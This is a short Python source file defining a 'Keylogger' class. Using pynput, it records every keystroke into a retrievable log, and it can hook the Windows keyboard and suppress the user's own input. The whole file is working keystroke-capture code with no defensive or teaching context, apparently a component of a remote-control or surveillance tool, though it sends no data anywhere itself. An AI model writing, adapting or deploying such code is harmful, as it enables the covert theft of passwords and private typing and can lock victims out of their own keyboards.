from pynput import keyboard
from threading import Event

class Keylogger():
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.on_press, win32_event_filter=self.win32_event_filter)
        self.log = ""
        self.block = Event()
        self.hook = Event()
    
    def win32_event_filter(self, message, data):
        self.listener._suppress = self.block.is_set()
        return self.hook.is_set()

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            _key = str(key).split('.')[1].upper()

            if _key == 'ENTER':
                self.log += f'[{_key}]\n'
            # elif _key == 'SPACE':
            #     string += ' '
            # elif _key == 'BACKSPACE':
            #     string = string[:-1]
            else:
                self.log += f'[{_key}]'
        except:
            pass
    
    def get_log(self):
        return self.log
    
    def clear_log(self):
        self.log = ""

    def start(self):
        self.listener.start()

    def stop(self):
        self.listener.stop()
    
    def hook_keyboard(self):
        self.hook.set()

    def unhook_keyboard(self):
        self.hook.clear()

    def block_keyboard(self):
        self.block.set()

    def unblock_keyboard(self):
        self.block.clear()